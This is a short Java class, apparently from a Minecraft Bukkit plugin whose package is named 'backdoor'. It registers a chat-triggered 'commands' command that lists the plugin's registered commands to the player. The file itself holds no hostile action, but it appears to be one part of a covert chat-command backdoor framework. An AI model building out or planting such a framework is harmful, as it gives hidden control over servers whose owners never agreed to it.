package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "commands", aliases = {"commands"})
public class CommandsCommand extends Command {
    Main main;

    public CommandsCommand(Main main) {
        this.main = main;
    }

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        StringBuilder sb = new StringBuilder();
        sb.append("commands: ");

        for (Command c : main.getCommandManager().getCommands()) {
            sb.append(c.getDisplayName());
            sb.append(", ");
        }
        sb.delete(sb.length() - 2, sb.length());

        event.getPlayer().sendMessage(sb.toString());
    }
}
